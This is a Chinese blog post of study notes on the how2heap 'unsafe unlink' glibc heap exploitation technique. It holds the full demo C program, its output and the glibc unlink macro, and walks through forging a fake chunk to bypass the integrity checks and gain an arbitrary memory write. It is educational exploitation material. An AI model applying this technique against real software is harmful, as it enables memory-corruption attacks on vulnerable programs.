---
title: how2heap之unsafe unlink
date: 2017-09-11 19:56:32
tags:
- pwn
- heap
---

我学习<https://github.com/shellphish/how2heap>的时候，遇到unsafe_unlink.c卡住了，琢磨了好久才弄通一些，整理下思路。
unsafe unlink是利用`unlink`将已经构造好的chunk块释放掉达到任意地址写的目的。

<!--more-->

## 源程序及输出

程序源码：
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


uint64_t *chunk0_ptr;

int main()
{
	printf("Welcome to unsafe unlink 2.0!\n");
	printf("Tested in Ubuntu 14.04/16.04 64bit.\n");
	printf("This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
	printf("The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

	int malloc_size = 0x80; //we want to be big enough not to use fastbins
	int header_size = 2;

	printf("The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

	chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
	uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
	printf("The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
	printf("The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

	printf("We create a fake chunk inside chunk0.\n");
	printf("We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
	chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
	printf("We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
	printf("With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
	chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
	printf("Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
	printf("Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

	printf("We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (fd->prev_size)\n");
	printf("With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False\n");
	printf("P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&(~ 0x7))");
	printf("If x = chunk0_ptr[1] & (~ 0x7), that is x = *(chunk0_ptr + x).");
	printf("We just need to set the *(chunk0_ptr + x) = x, so we can pass the check");
	printf("1.Now the x = chunk0_ptr[1]&(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing");
	printf("2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass");
	printf("3.Finally we can also set chunk0_ptr = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20");
	chunk0_ptr[1] = sizeof(size_t);
	printf("Therefore, we set the 'size' of our fake chunk to the value of chunk0_ptr[-3]: 0x%08lx\n", chunk0_ptr[1]);
	printf("You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30\n\n");

	printf("We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
	uint64_t *chunk1_hdr = chunk1_ptr - header_size;
	printf("We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
	printf("It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
	chunk1_hdr[0] = malloc_size;
	printf("If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
	printf("We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
	chunk1_hdr[1] &= ~1;

	printf("Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
	printf("You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
	free(chunk1_ptr);

	printf("At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
	char victim_string[8];
	strcpy(victim_string,"Hello!~");
	chunk0_ptr[3] = (uint64_t) victim_string;

	printf("chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
	printf("Original value: %s\n",victim_string);
	chunk0_ptr[0] = 0x4141414142424242LL;
	printf("New Value: %s\n",victim_string);
}
```

程序的编译：
```
gcc unsafe_unlink.c -o unsafe_unlink 
```
程序的输出为：
```
Welcome to unsafe unlink 2.0!
Tested in Ubuntu 14.04/16.04 64bit.
This technique can be used when you have a pointer at a known location to a region you can call unlink on.
The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.
The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.

The global chunk0_ptr is at 0x602068, pointing to 0xcba010, and the content is .
The victim chunk we are going to corrupt is at 0xcba0a0

We create a fake chunk inside chunk0.
We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.
We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.
With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False
Fake chunk fd: 0x602050
Fake chunk bk: 0x602058

We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (fd->prev_size)
With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False
P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&(~ 0x7))If x = chunk0_ptr[1] & (~ 0x7), that is x = *(chunk0_ptr + x).We just need to set the *(chunk0_ptr + x) = x, so we can pass the check1.Now the x = chunk0_ptr[1]&(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass3.Finally we can also set chunk0_ptr = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20
sizeof(size_t) = 8

Therefore, we set the 'size' of our fake chunk to the value of chunk0_ptr[-3]: 0x00000008
You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30

We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.

chunk1_hdr is at 0x7ffc79415270. value is 0xcba090
We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.
It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly
If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80
We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.

Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.
You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344

&chunk0_ptr[0] is 0xcba010, chunk0_ptr[0] is 0x00000000
&chunk0_ptr[1] is 0xcba018, chunk0_ptr[1] is 0x00000008
&chunk0_ptr[2] is 0xcba020, chunk0_ptr[2] is 0x00602050
&chunk0_ptr[3] is 0xcba028, chunk0_ptr[3] is 0x00602058

free chunk1_ptr
&chunk0_ptr[0] is 0x602050, chunk0_ptr[0] is 0x00000000
&chunk0_ptr[1] is 0x602058, chunk0_ptr[1] is 0x00000000
&chunk0_ptr[2] is 0x602060, chunk0_ptr[2] is 0x00000000
&chunk0_ptr[3] is 0x602068, chunk0_ptr[3] is 0x00602050
At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.
victim_string is at 0x7ffc79415280, victim_string is 0x7ffc79415280, content is Hello!~
chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.
Original value: Hello!~
New Value: BBBBAAAA
&chunk0_ptr[0] is 0x7ffc79415280, chunk0_ptr[0] is 0x4141414142424242
&chunk0_ptr[1] is 0x7ffc79415288, chunk0_ptr[1] is 0x3f5863ffa3c2a900
&chunk0_ptr[2] is 0x7ffc79415290, chunk0_ptr[2] is 0x00400c10
&chunk0_ptr[3] is 0x7ffc79415298, chunk0_ptr[3] is 0x7fe85997da40
```
这里面有些输出信息是我自己添加的。

## 程序分析

首先我们有个全部变量`chunk0_ptr`来保存malloc的地址，然后紧接着局部变量`chunk1_ptr`保存下一次malloc的地址。假设`chunk0`可以溢出，我们为了利用`free`函数时`unlink`操作，需要在`chunk0`的数据部分构造fake chunk（包括size,fd,bk），接着绕过`unlink`的防御机制，然后覆盖`chunk1`的堆头来满足释放`chunk1`时发生`consolidate backward`，unlink`chuck0`。
这样翻译过来就是`chunk0_ptr=(uint64_t *)(&chunk0_ptr-3)`，意味着`chunk0_ptr`指向了`chunk0_ptr[-3]`。之后给`chunk0_ptr[3]`赋任意可写地址，`chunk0_ptr`就可以修改该地址的内容，达到任意地址写。

## 关键点

关键点是绕过`unlink`的两个约束。 `malloc.c`的源码可参考<https://code.woboq.org/userspace/glibc/malloc/malloc.c.html>。

```
#define unlink(AV, P, BK, FD) {                                            \
	if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
	  malloc_printerr (check_action, "corrupted size vs. prev_size", P, AV);  \
	FD = P->fd;                                                                      \
	BK = P->bk;                                                                      \
	if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
	  malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
	else {                                                                      \
	    FD->bk = BK;                                                              \
	    BK->fd = FD;                                                              \
	    if (!in_smallbin_range (chunksize_nomask (P))                              \
	        && __builtin_expect (P->fd_nextsize != NULL, 0)) {                      \
	        if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)              \
	            || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
	          malloc_printerr (check_action,                                      \
	                           "corrupted double-linked list (not small)",    \
	                           P, AV);                                              \
	        if (FD->fd_nextsize == NULL) {                                      \
	            if (P->fd_nextsize == P)                                      \
	              FD->fd_nextsize = FD->bk_nextsize = FD;                      \
	            else {                                                              \
	                FD->fd_nextsize = P->fd_nextsize;                              \
	                FD->bk_nextsize = P->bk_nextsize;                              \
	                P->fd_nextsize->bk_nextsize = FD;                              \
	                P->bk_nextsize->fd_nextsize = FD;                              \
	              }                                                              \
	          } else {                                                              \
	            P->fd_nextsize->bk_nextsize = P->bk_nextsize;                      \
	            P->bk_nextsize->fd_nextsize = P->fd_nextsize;                      \
	          }                                                                      \
	      }                                                                      \
	  }                                                                              \
}
```
这里的`P`是`fake chunk`，也就是指针`chunk0_ptr`指向的伪造堆,先通过检查`(chunksize(P) != prev_size (next_chunk(P)) == False`。
根据推导令`x = chunk0_ptr[1] & (~ 0x7)`，即`x`为`fake chunk`的大小， 得出通过上述判定条件的公式为`*(chunk0_ptr+x)=x`。而我们的`size`位于偏移8字节处，所以`x=8`。这是我个人理解，源代码和参考博客里面的这部分我没有看懂。

为了通过`(P->fd->bk != P || P->bk->fd != P) == False`判断，（当然`P = chunk0_ptr`）根据偏移量计算即可轻松满足。
```
FD = &P - 3
BK = &P - 2
```

整个利用过程我觉得下面这张图片足够说明。

![整体结构图](../how2heap之unsafe-unlink/unsafe_unlink.jpg)

# 参考

[1] [how2heap-04 unsafe unlink实践笔记](http://vancir.com/posts/how2heap-04-unsafe-unlink)
[2] [linux堆溢出学习之unsafe unlink](http://blog.csdn.net/qq_29343201/article/details/53558216)

